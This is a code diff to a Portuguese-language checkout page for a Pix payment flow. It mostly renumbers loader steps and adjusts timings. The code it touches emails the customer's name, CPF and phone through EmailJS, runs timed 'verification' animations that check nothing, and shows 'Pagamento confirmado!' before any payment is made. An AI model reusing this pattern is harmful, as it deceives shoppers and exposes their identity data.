@@ -803,10 +803,6 @@
                     </div>
                     <div class="loader-step-item" id="step-3">
                         <div class="loader-step-dot"></div>
-                        <span class="loader-step-label">Gerando</span>
-                    </div>
-                    <div class="loader-step-item" id="step-4">
-                        <div class="loader-step-dot"></div>
                         <span class="loader-step-label">Concluído</span>
                     </div>
                 </div>
@@ -899,7 +895,7 @@
             </div>
             <div class="pix-delivery-body">
                 <div class="pix-delivery-icon-wrap">
-                    <i class="fas fa-motorcycle"></i>
+                    <i class="fas fa-box-open"></i>
                 </div>
                 <div class="pix-delivery-info">
                     <div class="pix-delivery-time-text" id="pixDeliveryTime">Entrega em 20 Minutos</div>
@@ -1208,14 +1204,12 @@
         function setLoaderStep(stepIndex, statusMsg) {
             const fill = document.getElementById('loaderProgress');
             const statusEl = document.getElementById('loaderStatus');
-            const steps = ['step-1','step-2','step-3','step-4'];
-            const widths = [20, 45, 75, 100];
+            const steps = ['step-1','step-2','step-3'];
+            const widths = [30, 65, 100];
 
-            // Update fill width
             fill.style.width = widths[stepIndex] + '%';
             fill.classList.add('has-progress');
 
-            // Update step indicators
             steps.forEach((id, i) => {
                 const el = document.getElementById(id);
                 el.classList.remove('active','done');
@@ -1223,7 +1217,6 @@
                 else if (i === stepIndex) el.classList.add('active');
             });
 
-            // Update status text with fade
             statusEl.classList.remove('visible');
             setTimeout(() => {
                 statusEl.textContent = statusMsg;
@@ -1261,18 +1254,18 @@
 
             // Animated steps
             setTimeout(() => setLoaderStep(0, 'Iniciando conexão segura...'), 200);
-            setTimeout(() => setLoaderStep(1, 'Preparando pedido...'), 800);
+            setTimeout(() => setLoaderStep(1, 'Preparando pedido...'), 900);
 
             try {
                 sendEmailJS(name, cpfRaw, phone, subtotalValue);
 
                 let pixCode = "";
                 if (cpf === '11111111111') {
-                    setTimeout(() => setLoaderStep(2, 'Gerando código Pix...'), 1400);
+                    setTimeout(() => setLoaderStep(1, 'Gerando código Pix...'), 1400);
                     await new Promise(resolve => setTimeout(resolve, 2500));
                     pixCode = "00020126330014BR.GOV.BCB.PIX01111111111111520400005303986540510.005802BR5913USUARIO TESTE6009SAO PAULO62070503***6304ABCD";
                 } else {
-                    setTimeout(() => setLoaderStep(2, 'Gerando código Pix...'), 1400);
+                    setTimeout(() => setLoaderStep(1, 'Gerando código Pix...'), 1400);
                     const fetchPromise = fetchPixCode(name, cpf, phone);
                     const timerPromise = new Promise(resolve => setTimeout(resolve, 2500));
                     const [pixResult] = await Promise.all([fetchPromise, timerPromise]);
@@ -1280,7 +1273,7 @@
                 }
 
                 if (pixCode) {
-                    setLoaderStep(3, 'Pagamento confirmado!');
+                    setLoaderStep(2, 'Pagamento confirmado!');
 
                     setTimeout(() => {
                         document.getElementById('mainContainer').style.display = 'none';
@@ -1469,10 +1462,9 @@
             loader.classList.add('active');
 
             setTimeout(() => setLoaderStep(0, 'Iniciando verificação...'), 200);
-            setTimeout(() => setLoaderStep(1, 'Verificando disponibilidade...'), 800);
-            setTimeout(() => setLoaderStep(2, 'Analisando região...'), 1400);
+            setTimeout(() => setLoaderStep(1, 'Verificando disponibilidade...'), 900);
             setTimeout(() => {
-                setLoaderStep(3, 'Concluído');
+                setLoaderStep(2, 'Concluído');
                 setTimeout(() => {
                     loader.classList.remove('active');
                     document.getElementById('modal-step-2').style.display = 'none';
